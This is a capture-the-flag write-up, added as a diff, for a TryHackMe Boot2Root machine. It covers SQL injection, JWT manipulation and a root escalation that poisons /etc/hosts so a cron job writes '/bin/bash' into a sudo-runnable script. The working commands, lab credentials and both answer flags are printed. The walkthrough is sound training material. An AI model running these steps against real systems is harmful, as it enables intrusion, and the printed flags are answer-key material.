@@ -1,0 +1,146 @@
+BOOT2ROOT MACHINE WRITEUP
+=========================
+
+MACHINE: Boot2Root CTF Machine
+AUTHOR: trix
+DATE: Completed November 2025
+LINK : https://tryhackme.com/jr/tr1x
+
+SUMMARY:
+This Boot2Root machine involved web application exploitation, SQL injection, JWT manipulation,
+and a creative privilege escalation path using DNS poisoning and cron job exploitation.
+
+TABLE OF CONTENTS:
+1. Initial Reconnaissance
+2. Web Application Exploitation
+3. FTP Access and Source Code Analysis
+4. SQL Injection Exploitation
+5. SSH Access and User Flag
+6. Privilege Escalation to Root
+7. Flags
+
+1. INITIAL RECONNAISSANCE
+-------------------------
+Port Scan Results:
+- Port 21: FTP
+- Port 22: SSH
+- Port 80: HTTP (Express.js web application)
+
+Web Application Discovery:
+- Express.js application at app.trix
+- Country selection form with Croatia and Serbia options
+
+2. WEB APPLICATION EXPLOITATION
+-------------------------------
+FTP Credentials Found:
+- Located in bane.jpg comment via strings command
+- Credentials: trix:tr1x0x
+
+Source Code Access:
+- Downloaded application source code via FTP
+- Discovered JWT secret: s3cr37k3y
+
+SQL Injection:
+- Boolean-based blind SQLi in /rank endpoint via JWT manipulation
+- Extracted admin credentials: adm1n:p4ssword
+
+SSH Key Retrieval:
+- Accessed /admin endpoint with admin credentials
+- Retrieved SSH private key for user trix
+
+3. USER ACCESS
+--------------
+SSH Connection:
+ssh trix@<machine_ip> -i id_rsa
+
+User Flag Location:
+/home/trix/user.txt
+
+USER FLAG:
+2p7SwH3M7cgaGSRr8dKNj2H3cftg9KBg
+
+4. PRIVILEGE ESCALATION PATH
+----------------------------
+Initial Enumeration:
+- Discovered cron job: /script.sh runs every minute as root
+- Script behavior: Fetches google.com title, writes to /script2.sh
+- Sudo privileges: Can run /script2.sh as root without password
+
+Key Files:
+- /script.sh - Root cron job
+- /script2.sh - Executable via sudo without password
+- /etc/hosts - Writable for DNS poisoning
+- /etc/nginx/sites-available/* - Writable nginx configs
+
+5. EXPLOITATION STRATEGY
+------------------------
+Approach: DNS Poisoning + Controlled Web Server
+
+Step 1: DNS Poisoning
+- Modified /etc/hosts to point google.com to attacker-controlled IP
+- Command: echo "192.168.128.53 google.com" > /etc/hosts
+
+Step 2: Web Server Setup
+- Set up Python HTTP server on attacker machine
+- Served malicious HTML with payload in title tag
+
+Step 3: Payload Delivery
+- Cron job fetches from google.com (now attacker-controlled)
+- Extracts title and writes to /script2.sh
+- Payload: "/bin/bash"
+
+Step 4: Root Shell Execution
+- Executed: sudo /script2.sh
+- Gained root shell due to sudo permissions
+
+6. ROOT ACCESS
+--------------
+Root Flag Location:
+/root/root.txt
+
+ROOT FLAG:
+Oj0I6xRyz9OBXOafJqQgAEe82xp5fh5d
+
+7. KEY COMMANDS USED
+--------------------
+# DNS Poisoning
+echo "192.168.128.53 google.com" > /etc/hosts
+
+# Web Server (Attacker)
+cd /tmp && python3 -m http.server 80
+
+# Payload HTML
+echo '<html><head><title>/bin/bash</title></head></html>' > index.html
+
+# Monitor cron updates
+while true; do echo "--- $(date) ---"; cat /script2.sh; sleep 2; done
+
+# Root access
+sudo /script2.sh
+
+8. VULNERABILITIES EXPLOITED
+----------------------------
+1. Information Disclosure (FTP credentials in image comment)
+2. Hardcoded JWT Secret
+3. SQL Injection in /rank endpoint
+4. Insecure File Permissions (writable system files)
+5. DNS Poisoning via /etc/hosts
+6. Privilege Escalation via Cron Job + Sudo
+
+9. LESSONS LEARNED
+------------------
+- Always check image metadata and comments
+- Never hardcode secrets in source code
+- Implement proper input validation for SQL queries
+- Use secure file permissions on system files
+- Monitor cron jobs and sudo permissions regularly
+- DNS poisoning can bypass application security controls
+
+FLAGS SUMMARY:
+==============
+User Flag: 2p7SwH3M7cgaGSRr8dKNj2H3cftg9KBg
+Root Flag: Oj0I6xRyz9OBXOafJqQgAEe82xp5fh5d
+
+COMPLETION TIME: Approximately 2-3 hours
+DIFFICULTY: Medium
+SKILLS: Web App Testing, SQL Injection, JWT, Linux Privilege Escalation
